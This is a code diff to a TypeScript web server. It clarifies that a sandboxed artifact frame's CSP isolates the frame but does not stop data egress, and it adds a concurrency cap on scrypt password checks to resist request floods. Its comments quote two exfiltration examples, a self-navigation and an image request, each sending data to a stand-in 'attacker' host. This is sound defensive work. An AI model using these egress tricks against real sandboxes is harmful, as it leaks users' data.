@@ -185,11 +185,16 @@ function hashesForFile(filePath: string): string[] {
  * CSP for the artifact isolation frame (public/artifact-frame.html).
  *
  * This document exists to run a trusted artifact's own markup and scripts, so unlike every other
- * page it must allow inline script and style. What keeps that safe is everything it withholds:
- * no connect-src and no form-action, so a payload cannot exfiltrate what it renders or phish
- * credentials to a remote endpoint, and the embedding iframe carries `sandbox="allow-scripts"`
- * without `allow-same-origin`, so the document sits in an opaque origin with no access to the
- * viewer DOM, the auth cookie, or the artifact API.
+ * page it must allow inline script and style. The embedding iframe carries `sandbox="allow-scripts"`
+ * without `allow-same-origin`, so the document sits in an opaque origin with no access to the viewer
+ * DOM, the auth cookie, or the artifact API. Absent connect-src and form-action remove the obvious
+ * egress paths (fetch/XHR/beacon, form posts).
+ *
+ * This is NOT an egress guarantee, and must not be described as one. A script can navigate its own
+ * frame (`location = "https://attacker/?d=..."`), and no CSP directive blocks self-navigation --
+ * `navigate-to` was never shipped. Running untrusted scripts and preventing egress are mutually
+ * exclusive; this deployment mode chooses to run them. The protection this frame does provide is
+ * isolation from the viewer origin, which is what stops an artifact reading the operator's session.
  *
  * img-src stays same-origin for the same reason connect-src is absent: `default-src 'none'` does
  * not cover images, so allowing remote hosts would let `<img src="https://attacker/?d=...">` (or a
@@ -417,6 +422,17 @@ function constantTimeEqual(left: string, right: string): boolean {
 const failedAuthAttempts = new Map<string, { count: number; resetAt: number }>();
 const AUTH_ATTEMPT_WINDOW_MS = 60_000;
 const MAX_AUTH_ATTEMPTS_PER_WINDOW = 10;
+/**
+ * Derivations started but not yet finished, per client.
+ *
+ * Counting only *recorded failures* leaves the limit useless against a burst: every request in a
+ * concurrent flood passes the pre-check before any of them has failed and been recorded, so all of
+ * them queue scrypt work at once and saturate the libuv pool. In-flight work counts toward the
+ * budget from the moment it starts.
+ */
+const inFlightAuthDerivations = new Map<string, number>();
+/** Concurrent derivations one client may have running regardless of its failure count. */
+const MAX_CONCURRENT_AUTH_DERIVATIONS = 2;
 
 /**
  * Identifies the client for rate-limiting purposes.
@@ -441,6 +457,11 @@ function clientKey(req: IncomingMessage): string {
 /** True when this client has spent its attempt budget and should be refused before any KDF work. */
 function isAuthRateLimited(req: IncomingMessage): boolean {
   const key = clientKey(req);
+
+  if ((inFlightAuthDerivations.get(key) ?? 0) >= MAX_CONCURRENT_AUTH_DERIVATIONS) {
+    return true;
+  }
+
   const entry = failedAuthAttempts.get(key);
   if (entry === undefined) return false;
   if (Date.now() >= entry.resetAt) {
@@ -448,6 +469,19 @@ function isAuthRateLimited(req: IncomingMessage): boolean {
     return false;
   }
   return entry.count >= MAX_AUTH_ATTEMPTS_PER_WINDOW;
+}
+
+/** Runs `verify` while its cost counts against the client's concurrency budget. */
+async function withAuthDerivationSlot(req: IncomingMessage, verify: () => Promise<boolean>): Promise<boolean> {
+  const key = clientKey(req);
+  inFlightAuthDerivations.set(key, (inFlightAuthDerivations.get(key) ?? 0) + 1);
+  try {
+    return await verify();
+  } finally {
+    const remaining = (inFlightAuthDerivations.get(key) ?? 1) - 1;
+    if (remaining <= 0) inFlightAuthDerivations.delete(key);
+    else inFlightAuthDerivations.set(key, remaining);
+  }
 }
 
 function recordFailedAuth(req: IncomingMessage): void {
@@ -509,7 +543,7 @@ async function hasValidApiAuth(req: IncomingMessage): Promise<boolean> {
   if (authKey === null || hasValidCookie(req)) return true;
   const authorization = req.headers.authorization;
   if (!authorization?.startsWith("Bearer ")) return false;
-  return isValidPassword(authorization.slice("Bearer ".length));
+  return withAuthDerivationSlot(req, () => isValidPassword(authorization.slice("Bearer ".length)));
 }
 
 function safeRedirect(value: string | null): string {
@@ -672,7 +706,7 @@ async function handleRequest(req: IncomingMessage, res: ServerResponse): Promise
       htmlResponse(res, 429, passwordPage(redirect, true));
       return;
     }
-    if (await isValidPassword(suppliedPassword)) {
+    if (await withAuthDerivationSlot(req, () => isValidPassword(suppliedPassword))) {
       // Secure only when the request arrived over TLS: on a direct-HTTP deployment the browser would
       // drop a Secure cookie and every gated page would loop back to the sign-in form.
       const secureAttribute = isSecureRequest(req) ? " Secure;" : "";
